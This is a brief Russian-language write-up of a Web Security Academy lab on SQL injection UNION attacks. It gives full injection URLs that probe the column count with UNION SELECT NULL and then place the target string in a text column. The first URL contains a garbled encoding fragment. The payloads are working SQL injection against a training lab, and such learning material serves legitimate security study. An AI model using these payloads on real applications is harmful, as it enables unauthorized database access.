## SQL injection UNION attack, finding a column containing text
Нужно заставить базу вернуть текст `gMFpEw`
1. Известно что sql инъекция в фильтрах товара
1. Определяем количество столбцов, выбираемых из базы:
запрос `https://ac831fb71f4d5b6780be5e8700a100aa.web-security-academy.net/filter?category=Corporate+gifts%27%20union%20select%20NULL,%20%NULL%27,%20NULL--` выполняется без ошибок.
1. Подставляем вместо каждого из null поочередно строку "gMFpEw":
решение `https://ac831fb71f4d5b6780be5e8700a100aa.web-security-academy.net/filter?category=Corporate+gifts%27%20union%20select%20NULL,%20%27gMFpEw%27,%20NULL--`